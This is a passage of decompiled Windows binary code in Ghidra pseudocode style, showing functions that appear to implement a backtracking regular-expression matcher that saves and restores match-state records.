    cVar4 = '\0';
    uVar5 = 0;
    (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if (cVar4 != '\0') {
LAB_0040ac55:
      return CONCAT31(uVar5,1);
    }
    *puVar6 = uVar2;
    puVar6[1] = uVar3;
    *(undefined *)(puVar6 + 2) = uVar1;
  }
  return (uint)uVar5 << 8;
}



int __thiscall FUN_0040ac59(void *this,int *param_1,undefined4 param_2)

{
  undefined uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  char cVar4;
  uint3 uVar5;
  undefined4 *puVar6;
  
  if (*(int *)((int)this + 0x10) == -1) {
    cVar4 = '\0';
    uVar5 = 0;
    (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if (cVar4 != '\0') goto LAB_0040acc2;
  }
  else {
    puVar6 = (undefined4 *)(*(int *)((int)this + 0x10) * 0x1a + *param_1);
    uVar1 = *(undefined *)(puVar6 + 2);
    uVar2 = *puVar6;
    uVar3 = puVar6[1];
    *(undefined *)(puVar6 + 2) = 1;
    *puVar6 = *(undefined4 *)((int)puVar6 + 9);
    puVar6[1] = param_2;
    cVar4 = '\0';
    uVar5 = 0;
    (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if (cVar4 != '\0') {
LAB_0040acc2:
      return CONCAT31(uVar5,1);
    }
    *puVar6 = uVar2;
    puVar6[1] = uVar3;
    *(undefined *)(puVar6 + 2) = uVar1;
  }
  return (uint)uVar5 << 8;
}



uint __thiscall FUN_0040acc6(void *this,int *param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  char cVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *puVar8;
  undefined1 unaff_DI;
  undefined4 *puVar9;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_c = (undefined4 *)0x0;
  local_8 = (undefined4 *)&stack0xffffffe8;
  iVar7 = *(int *)((int)this + 0x29);
  if (iVar7 != 0) {
    FUN_00415390(unaff_DI);
    iVar1 = *(int *)((int)this + 0x25);
    iVar2 = *param_1;
    for (puVar4 = (undefined4 *)(iVar1 * 0x1a + iVar2); local_c = (undefined4 *)&stack0xffffffe8,
        puVar4 != (undefined4 *)((iVar1 + iVar7) * 0x1a + iVar2);
        puVar4 = (undefined4 *)((int)puVar4 + 0x1a)) {
      if (local_8 != (undefined4 *)0x0) {
        puVar6 = puVar4;
        puVar8 = local_8;
        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar8 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar8 = puVar8 + 1;
        }
        *(undefined2 *)puVar8 = *(undefined2 *)puVar6;
      }
      local_8 = (undefined4 *)((int)local_8 + 0x1a);
    }
  }
  puVar4 = (undefined4 *)FUN_0040a807(this,param_1,param_2);
  cVar3 = (char)puVar4;
  if (*(char *)((int)this + 0x24) == cVar3) {
    if ((cVar3 != '\0') && (*(int *)((int)this + 0x10) != -1)) {
      param_2 = *(char **)(*(int *)((int)this + 0x10) * 0x1a + 4 + *param_1);
    }
    puVar4 = (undefined4 *)(**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)puVar4 != '\0') {
      return CONCAT31((int3)((uint)puVar4 >> 8),1);
    }
  }
  if ((*(int *)((int)this + 0x29) != 0) && (cVar3 != '\0')) {
    puVar4 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
    puVar6 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)local_c);
    for (; local_c != puVar6; local_c = (undefined4 *)((int)local_c + 0x1a)) {
      puVar8 = local_c;
      puVar9 = puVar4;
      for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
        *puVar9 = *puVar8;
        puVar8 = puVar8 + 1;
        puVar9 = puVar9 + 1;
      }
      puVar4 = (undefined4 *)((int)puVar4 + 0x1a);
      *(undefined2 *)puVar9 = *(undefined2 *)puVar8;
    }
  }
  return (uint)puVar4 & 0xffffff00;
}



uint __thiscall FUN_0040adad(void *this,int *param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  char cVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *puVar8;
  undefined1 unaff_DI;
  undefined4 *puVar9;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_c = (undefined4 *)0x0;
  local_8 = (undefined4 *)&stack0xffffffe8;
  iVar7 = *(int *)((int)this + 0x29);
  if (iVar7 != 0) {
    FUN_00415390(unaff_DI);
    iVar1 = *(int *)((int)this + 0x25);
    iVar2 = *param_1;
    for (puVar4 = (undefined4 *)(iVar1 * 0x1a + iVar2); local_c = (undefined4 *)&stack0xffffffe8,
        puVar4 != (undefined4 *)((iVar1 + iVar7) * 0x1a + iVar2);
        puVar4 = (undefined4 *)((int)puVar4 + 0x1a)) {
      if (local_8 != (undefined4 *)0x0) {
        puVar6 = puVar4;
        puVar8 = local_8;
        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar8 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar8 = puVar8 + 1;
        }
        *(undefined2 *)puVar8 = *(undefined2 *)puVar6;
      }
      local_8 = (undefined4 *)((int)local_8 + 0x1a);
    }
  }
  puVar4 = (undefined4 *)FUN_0040a89a(this,param_1,param_2);
  cVar3 = (char)puVar4;
  if (*(char *)((int)this + 0x24) == cVar3) {
    if ((cVar3 != '\0') && (*(int *)((int)this + 0x10) != -1)) {
      param_2 = *(char **)(*(int *)((int)this + 0x10) * 0x1a + 4 + *param_1);
    }
    puVar4 = (undefined4 *)(**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)puVar4 != '\0') {
      return CONCAT31((int3)((uint)puVar4 >> 8),1);
    }
  }
  if ((*(int *)((int)this + 0x29) != 0) && (cVar3 != '\0')) {
    puVar4 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
    puVar6 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)local_c);
    for (; local_c != puVar6; local_c = (undefined4 *)((int)local_c + 0x1a)) {
      puVar8 = local_c;
      puVar9 = puVar4;
      for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
        *puVar9 = *puVar8;
        puVar8 = puVar8 + 1;
        puVar9 = puVar9 + 1;
      }
      puVar4 = (undefined4 *)((int)puVar4 + 0x1a);
      *(undefined2 *)puVar9 = *(undefined2 *)puVar8;
    }
  }
  return (uint)puVar4 & 0xffffff00;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __thiscall FUN_0040ae95(void *this,int *param_1)

{
  int iVar1;
  uint uVar2;
  undefined uVar3;
  undefined *local_1c;
  undefined4 local_18;
  void *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415f5c;
  local_10 = ExceptionList;
  local_18 = 0;
  local_1c = &DAT_00417e9c;
  local_8 = 0;
  ExceptionList = &local_10;
  local_14 = this;
  FUN_0040bf30(this,param_1);
  iVar1 = param_1[2];
  uVar2 = FUN_0040a64e((int *)&local_1c,(uint)param_1,iVar1);
  if (*(char *)((int)this + 0x24) == (char)uVar2) {
    if (((char)uVar2 != '\0') && (*(int *)((int)this + 0x10) == -1)) {
      param_1[2] = iVar1;
    }
    uVar3 = 1;
    param_1[4] = *(int *)((int)this + 4);
  }
  else {
    FUN_00408804(this,param_1);
    uVar3 = 0;
  }
  local_8 = 0xffffffff;
  FUN_00407152(&local_1c);
  ExceptionList = local_10;
  return uVar3;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __thiscall FUN_0040af1b(void *this,int *param_1)

{
  int iVar1;
  uint uVar2;
  undefined uVar3;
  undefined *local_1c;
  undefined4 local_18;
  void *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415f70;
  local_10 = ExceptionList;
  local_18 = 0;
  local_1c = &DAT_00417e9c;
  local_8 = 0;
  ExceptionList = &local_10;
  local_14 = this;
  FUN_0040bf30(this,param_1);
  iVar1 = param_1[2];
  uVar2 = FUN_0040a759((int *)&local_1c,(uint)param_1,iVar1);
  if (*(char *)((int)this + 0x24) == (char)uVar2) {
    if (((char)uVar2 != '\0') && (*(int *)((int)this + 0x10) == -1)) {
      param_1[2] = iVar1;
    }
    uVar3 = 1;
    param_1[4] = *(int *)((int)this + 4);
  }
  else {
    FUN_00408804(this,param_1);
    uVar3 = 0;
  }
  local_8 = 0xffffffff;
  FUN_00407152(&local_1c);
  ExceptionList = local_10;
  return uVar3;
}



uint __thiscall FUN_0040afa1(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  int iVar5;
  undefined4 **ppuVar6;
  int iVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  undefined1 unaff_DI;
  char *pcVar10;
  undefined4 *puVar11;
  int local_40;
  int local_3c;
  int local_38;
  int local_34;
  undefined4 local_30;
  int local_2c;
  int local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined local_1c;
  undefined local_1b;
  char *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  undefined4 *local_c;
  char local_5;
  
  puVar3 = (undefined4 *)(param_2 - param_1[5]);
  local_14 = puVar3;
  if (*(undefined4 **)((int)this + 0x14) <= puVar3) {
    iVar7 = *(int *)((int)this + 0x29);
    local_c = (undefined4 *)0x0;
    if (iVar7 != 0) {
      FUN_00415390(unaff_DI);
      iVar1 = *(int *)((int)this + 0x25);
      local_c = (undefined4 *)&stack0xffffffb4;
      local_10 = (undefined4 *)&stack0xffffffb4;
      iVar2 = *param_1;
      for (puVar3 = (undefined4 *)(iVar1 * 0x1a + iVar2);
          puVar3 != (undefined4 *)((iVar1 + iVar7) * 0x1a + iVar2);
          puVar3 = (undefined4 *)((int)puVar3 + 0x1a)) {
        if (local_10 != (undefined4 *)0x0) {
          puVar8 = puVar3;
          puVar9 = local_10;
          for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
            *puVar9 = *puVar8;
            puVar8 = puVar8 + 1;
            puVar9 = puVar9 + 1;
          }
          *(undefined2 *)puVar9 = *(undefined2 *)puVar8;
        }
        local_10 = (undefined4 *)((int)local_10 + 0x1a);
      }
    }
    ppuVar6 = (undefined4 **)((int)this + 0x18);
    if (local_14 <= *(undefined4 **)((int)this + 0x18)) {
      ppuVar6 = &local_14;
    }
    local_40 = *param_1;
    local_30 = 0;
    local_34 = param_1[3];
    local_24 = 0;
    local_20 = 0;
    local_1c = 0;
    local_1b = 0;
    local_18 = (char *)(param_2 - *(int *)((int)this + 0x14));
    local_2c = param_1[5];
    pcVar10 = (char *)(param_2 - (int)*ppuVar6);
    local_38 = param_1[6];
    local_3c = param_2;
    local_28 = local_38;
    do {
      local_10 = (undefined4 *)pcVar10;
      puVar3 = (undefined4 *)FUN_0040a807(this,&local_40,pcVar10);
      local_5 = (char)puVar3;
      if ((*(char *)((int)this + 0x24) == local_5) &&
         (puVar3 = (undefined4 *)(**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
         (char)puVar3 != '\0')) {
        return CONCAT31((int3)((uint)puVar3 >> 8),1);
      }
      if (local_5 != '\0') {
        if (*(int *)((int)this + 0x29) != 0) {
          local_14 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)local_c);
          puVar3 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
          for (puVar8 = local_c; puVar8 != local_14; puVar8 = (undefined4 *)((int)puVar8 + 0x1a)) {
            puVar9 = puVar8;
            puVar11 = puVar3;
            for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
              *puVar11 = *puVar9;
              puVar9 = puVar9 + 1;
              puVar11 = puVar11 + 1;
            }
            puVar3 = (undefined4 *)((int)puVar3 + 0x1a);
            *(undefined2 *)puVar11 = *(undefined2 *)puVar9;
            pcVar10 = (char *)local_10;
          }
        }
        if (*(char *)((int)this + 0x24) == '\0') goto LAB_0040b0fc;
      }
      if (pcVar10 == local_18) goto LAB_0040b0fc;
      pcVar10 = pcVar10 + 1;
    } while( true );
  }
  if (*(char *)((int)this + 0x24) == '\0') {
    uVar4 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
  }
  else {
LAB_0040b0fc:
    uVar4 = (uint)puVar3 & 0xffffff00;
  }
  return uVar4;
}



uint __thiscall FUN_0040b108(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  int iVar5;
  undefined4 **ppuVar6;
  int iVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  undefined1 unaff_DI;
  char *pcVar10;
  undefined4 *puVar11;
  int local_40;
  int local_3c;
  int local_38;
  int local_34;
  undefined4 local_30;
  int local_2c;
  int local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined local_1c;
  undefined local_1b;
  char *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  undefined4 *local_c;
  char local_5;
  
  puVar3 = (undefined4 *)(param_2 - param_1[5]);
  local_14 = puVar3;
  if (*(undefined4 **)((int)this + 0x14) <= puVar3) {
    iVar7 = *(int *)((int)this + 0x29);
    local_c = (undefined4 *)0x0;
    if (iVar7 != 0) {
      FUN_00415390(unaff_DI);
      iVar1 = *(int *)((int)this + 0x25);
      local_c = (undefined4 *)&stack0xffffffb4;
      local_10 = (undefined4 *)&stack0xffffffb4;
      iVar2 = *param_1;
      for (puVar3 = (undefined4 *)(iVar1 * 0x1a + iVar2);
          puVar3 != (undefined4 *)((iVar1 + iVar7) * 0x1a + iVar2);
          puVar3 = (undefined4 *)((int)puVar3 + 0x1a)) {
        if (local_10 != (undefined4 *)0x0) {
          puVar8 = puVar3;
          puVar9 = local_10;
          for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
            *puVar9 = *puVar8;
            puVar8 = puVar8 + 1;
            puVar9 = puVar9 + 1;
          }
          *(undefined2 *)puVar9 = *(undefined2 *)puVar8;
        }
        local_10 = (undefined4 *)((int)local_10 + 0x1a);
      }
    }
    ppuVar6 = (undefined4 **)((int)this + 0x18);
    if (local_14 <= *(undefined4 **)((int)this + 0x18)) {
      ppuVar6 = &local_14;
    }
    local_40 = *param_1;
    local_30 = 0;
    local_34 = param_1[3];
    local_24 = 0;
    local_20 = 0;
    local_1c = 0;
    local_1b = 0;
    local_18 = (char *)(param_2 - *(int *)((int)this + 0x14));
    local_2c = param_1[5];
    pcVar10 = (char *)(param_2 - (int)*ppuVar6);
    local_38 = param_1[6];
    local_3c = param_2;
    local_28 = local_38;
    do {
      local_10 = (undefined4 *)pcVar10;
      puVar3 = (undefined4 *)FUN_0040a807(this,&local_40,pcVar10);
      local_5 = (char)puVar3;
      if ((*(char *)((int)this + 0x24) == local_5) &&
         (puVar3 = (undefined4 *)(**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
         (char)puVar3 != '\0')) {
        return CONCAT31((int3)((uint)puVar3 >> 8),1);
      }
      if (local_5 != '\0') {
        if (*(int *)((int)this + 0x29) != 0) {
          local_14 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)local_c);
          puVar3 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
          for (puVar8 = local_c; puVar8 != local_14; puVar8 = (undefined4 *)((int)puVar8 + 0x1a)) {
            puVar9 = puVar8;
            puVar11 = puVar3;
            for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
              *puVar11 = *puVar9;
              puVar9 = puVar9 + 1;
              puVar11 = puVar11 + 1;
            }
            puVar3 = (undefined4 *)((int)puVar3 + 0x1a);
            *(undefined2 *)puVar11 = *(undefined2 *)puVar9;
            pcVar10 = (char *)local_10;
          }
        }
        if (*(char *)((int)this + 0x24) == '\0') goto LAB_0040b265;
      }
      if (pcVar10 == local_18) goto LAB_0040b265;
      pcVar10 = pcVar10 + 1;
    } while( true );
  }
  if (*(char *)((int)this + 0x24) == '\0') {
    uVar4 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
  }
  else {
LAB_0040b265:
    uVar4 = (uint)puVar3 & 0xffffff00;
  }
  return uVar4;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __thiscall FUN_0040b271(void *this,int *param_1)

{
  int *piVar1;
  int **ppiVar2;
  uint uVar3;
  undefined uVar4;
  int local_48;
  int local_44;
  int local_40;
  int local_3c;
  undefined4 local_38;
  int local_34;
  int local_30;
  undefined4 local_2c;
  int local_28;
  undefined local_24;
  undefined local_23;
  undefined *local_20;
  undefined4 local_1c;
  void *local_18;
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  piVar1 = param_1;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415f84;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_0040bf30(this,param_1);
  local_44 = param_1[2];
  local_14 = (int *)(local_44 - param_1[5]);
  if (local_14 < *(int **)((int)this + 0x14)) {
    if (*(char *)((int)this + 0x24) == '\0') {
      param_1[4] = *(int *)((int)this + 4);
      uVar4 = 1;
    }
    else {
      FUN_00408804(this,param_1);
LAB_0040b397:
      uVar4 = 0;
    }
  }
  else {
    ppiVar2 = (int **)((int)this + 0x18);
    if (local_14 <= *(int **)((int)this + 0x18)) {
      ppiVar2 = &local_14;
    }
    local_48 = *param_1;
    uVar4 = 0;
    local_14 = (int *)(local_44 - (int)*(int **)((int)this + 0x14));
    local_3c = param_1[3];
    local_40 = param_1[6];
    local_34 = param_1[5];
    local_28 = param_1[8];
    local_38 = 0;
    local_2c = 0;
    local_24 = 0;
    local_23 = 0;
    local_1c = 0;
    local_20 = &DAT_00417e9c;
    local_8 = 0;
    param_1 = (int *)(local_44 - (int)*ppiVar2);
    local_30 = local_40;
    local_18 = this;
    while( true ) {
      uVar3 = FUN_0040a64e((int *)&local_20,(uint)&local_48,param_1);
      if (*(char *)((int)this + 0x24) == (char)uVar3) break;
      if ((char)uVar3 != '\0') {
        FUN_00408804(this,piVar1);
        if (*(char *)((int)this + 0x24) == '\0') goto LAB_0040b373;
        FUN_0040bf30(this,piVar1);
      }
      if (param_1 == local_14) {
        FUN_00408804(this,piVar1);
        local_8 = 0xffffffff;
        FUN_00407152(&local_20);
        goto LAB_0040b397;
      }
      param_1 = (int *)((int)param_1 + 1);
    }
    uVar4 = 1;
    piVar1[4] = *(int *)((int)this + 4);
LAB_0040b373:
    local_8 = 0xffffffff;
    FUN_00407152(&local_20);
  }
  ExceptionList = local_10;
  return uVar4;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __thiscall FUN_0040b3aa(void *this,int *param_1)

{
  int *piVar1;
  int **ppiVar2;
  uint uVar3;
  undefined uVar4;
  int local_48;
  int local_44;
  int local_40;
  int local_3c;
  undefined4 local_38;
  int local_34;
  int local_30;
  undefined4 local_2c;
  int local_28;
  undefined local_24;
  undefined local_23;
  undefined *local_20;
  undefined4 local_1c;
  void *local_18;
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  piVar1 = param_1;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415f98;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_0040bf30(this,param_1);
  local_44 = param_1[2];
  local_14 = (int *)(local_44 - param_1[5]);
  if (local_14 < *(int **)((int)this + 0x14)) {
    if (*(char *)((int)this + 0x24) == '\0') {
      param_1[4] = *(int *)((int)this + 4);
      uVar4 = 1;
    }
    else {
      FUN_00408804(this,param_1);
LAB_0040b4d0:
      uVar4 = 0;
    }
  }
  else {
    ppiVar2 = (int **)((int)this + 0x18);
    if (local_14 <= *(int **)((int)this + 0x18)) {
      ppiVar2 = &local_14;
    }
    local_48 = *param_1;
    uVar4 = 0;
    local_14 = (int *)(local_44 - (int)*(int **)((int)this + 0x14));
    local_3c = param_1[3];
    local_40 = param_1[6];
    local_34 = param_1[5];
    local_28 = param_1[8];
    local_38 = 0;
    local_2c = 0;
    local_24 = 0;
    local_23 = 0;
    local_1c = 0;
    local_20 = &DAT_00417e9c;
    local_8 = 0;
    param_1 = (int *)(local_44 - (int)*ppiVar2);
    local_30 = local_40;
    local_18 = this;
    while( true ) {
      uVar3 = FUN_0040a64e((int *)&local_20,(uint)&local_48,param_1);
      if (*(char *)((int)this + 0x24) == (char)uVar3) break;
      if ((char)uVar3 != '\0') {
        FUN_00408804(this,piVar1);
        if (*(char *)((int)this + 0x24) == '\0') goto LAB_0040b4ac;
        FUN_0040bf30(this,piVar1);
      }
      if (param_1 == local_14) {
        FUN_00408804(this,piVar1);
        local_8 = 0xffffffff;
        FUN_00407152(&local_20);
        goto LAB_0040b4d0;
      }
      param_1 = (int *)((int)param_1 + 1);
    }
    uVar4 = 1;
    piVar1[4] = *(int *)((int)this + 4);
LAB_0040b4ac:
    local_8 = 0xffffffff;
    FUN_00407152(&local_20);
  }
  ExceptionList = local_10;
  return uVar4;
}



void __cdecl FUN_0040b4e3(char *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  
  pcVar2 = param_2;
  if (param_1 != param_2) {
    do {
      pcVar1 = param_1;
      param_1 = pcVar1 + 1;
      pcVar2 = param_2;
      if (param_1 == param_2) break;
      pcVar2 = pcVar1;
    } while (*pcVar1 != *param_1);
  }
  FUN_00413c33(pcVar2,param_2,pcVar2);
  return;
}



bool __thiscall FUN_0040b510(void *this,int *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 uVar5;
  bool bVar6;
  
  iVar4 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
  uVar1 = *(undefined4 *)(iVar4 + 0x12 + *param_1);
  iVar4 = iVar4 + *param_1;
  uVar2 = *(undefined4 *)(iVar4 + 0x16);
  uVar3 = *(undefined4 *)(iVar4 + 0xd);
  *(undefined4 *)(iVar4 + 0x12) = 0;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = param_2;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = 0;
  uVar5 = FUN_00413c63(this,param_1,param_2);
  bVar6 = (char)uVar5 == '\0';
  if (bVar6) {
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = uVar3;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = uVar2;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x12 + *param_1) = uVar1;
  }
  return !bVar6;
}



bool __thiscall FUN_0040b5af(void *this,int *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 uVar5;
  bool bVar6;
  
  iVar4 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
  uVar1 = *(undefined4 *)(iVar4 + 0x12 + *param_1);
  iVar4 = iVar4 + *param_1;
  uVar2 = *(undefined4 *)(iVar4 + 0x16);
  uVar3 = *(undefined4 *)(iVar4 + 0xd);
  *(undefined4 *)(iVar4 + 0x12) = 0;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = param_2;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = 0;
  uVar5 = FUN_00413cc7(this,param_1,param_2);
  bVar6 = (char)uVar5 == '\0';
  if (bVar6) {
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = uVar3;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = uVar2;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x12 + *param_1) = uVar1;
  }
  return !bVar6;
}



uint __thiscall FUN_0040b64e(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  
  iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
  iVar1 = *(int *)(iVar2 + 0x12 + *param_1);
  iVar2 = iVar2 + *param_1;
  if (param_2 == iVar1) {
    uVar3 = (**(code **)**(undefined4 **)(*(int *)((int)this + 8) + 4))(param_1,param_2);
  }
  else {
    *(undefined4 *)(iVar2 + 0x12) = *(undefined4 *)(iVar2 + 0x16);
    *(int *)(*(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) =
         param_2;
    uVar4 = FUN_00413c63(*(void **)((int)this + 8),param_1,param_2);
    if ((char)uVar4 == '\0') {
      iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
      *(undefined4 *)(iVar2 + 0x16) = *(undefined4 *)(iVar2 + 0x12);
      uVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
      *(int *)(uVar3 + 0x12 + *param_1) = iVar1;
      uVar3 = uVar3 & 0xffffff00;
    }
    else {
      uVar3 = CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
  }
  return uVar3;
}



uint __thiscall FUN_0040b6dd(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  
  iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
  iVar1 = *(int *)(iVar2 + 0x12 + *param_1);
  iVar2 = iVar2 + *param_1;
  if (param_2 == iVar1) {
    uVar3 = (**(code **)(**(int **)(*(int *)((int)this + 8) + 4) + 4))(param_1,param_2);
  }
  else {
    *(undefined4 *)(iVar2 + 0x12) = *(undefined4 *)(iVar2 + 0x16);
    *(int *)(*(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) =
         param_2;
    uVar4 = FUN_00413cc7(*(void **)((int)this + 8),param_1,param_2);
    if ((char)uVar4 == '\0') {
      iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
      *(undefined4 *)(iVar2 + 0x16) = *(undefined4 *)(iVar2 + 0x12);
      uVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a;
      *(int *)(uVar3 + 0x12 + *param_1) = iVar1;
      uVar3 = uVar3 & 0xffffff00;
    }
    else {
      uVar3 = CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
  }
  return uVar3;
}



bool __thiscall FUN_0040b76d(void *this,int *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 uVar5;
  bool bVar6;
  
  iVar4 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
  uVar1 = *(undefined4 *)(iVar4 + 0x12 + *param_1);
  iVar4 = iVar4 + *param_1;
  uVar2 = *(undefined4 *)(iVar4 + 0x16);
  uVar3 = *(undefined4 *)(iVar4 + 0xd);
  *(undefined4 *)(iVar4 + 0x12) = 0;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = param_2;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = 0;
  uVar5 = FUN_00413d2d(this,param_1,param_2);
  bVar6 = (char)uVar5 == '\0';
  if (bVar6) {
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = uVar3;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = uVar2;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x12 + *param_1) = uVar1;
  }
  return !bVar6;
}



bool __thiscall FUN_0040b80c(void *this,int *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 uVar5;
  bool bVar6;
  
  iVar4 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
  uVar1 = *(undefined4 *)(iVar4 + 0x12 + *param_1);
  iVar4 = iVar4 + *param_1;
  uVar2 = *(undefined4 *)(iVar4 + 0x16);
  uVar3 = *(undefined4 *)(iVar4 + 0xd);
  *(undefined4 *)(iVar4 + 0x12) = 0;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = param_2;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = 0;
  uVar5 = FUN_00413da0(this,param_1,param_2);
  bVar6 = (char)uVar5 == '\0';
  if (bVar6) {
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) = uVar3;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x16 + *param_1) = uVar2;
    *(undefined4 *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0x12 + *param_1) = uVar1;
  }
  return !bVar6;
}



uint __thiscall FUN_0040b8ab(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  
